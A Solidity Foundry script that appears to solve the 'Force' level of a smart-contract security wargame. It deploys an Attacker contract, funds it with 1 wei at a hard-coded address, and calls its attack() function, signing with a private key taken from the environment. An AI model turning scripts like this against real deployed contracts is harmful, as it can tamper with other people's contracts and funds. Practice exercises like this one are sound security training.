// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Attacker} from "../src/07-Force/Attacker.sol";

interface IForce {
    
}

contract DeployAttacker is Script{
    
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker();
        vm.stopBroadcast();   
    }
}

contract Attack is Script {
    address constant public DEPLOYED_ATTACKER_ADDRESS = 0x2525A0742103bc2E356B5B2e5483f176CfBD91EC; 
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address(Attacker(payable(DEPLOYED_ATTACKER_ADDRESS))).call{value: 1}("");
        Attacker(payable(DEPLOYED_ATTACKER_ADDRESS)).attack();
        vm.stopBroadcast();
    }
}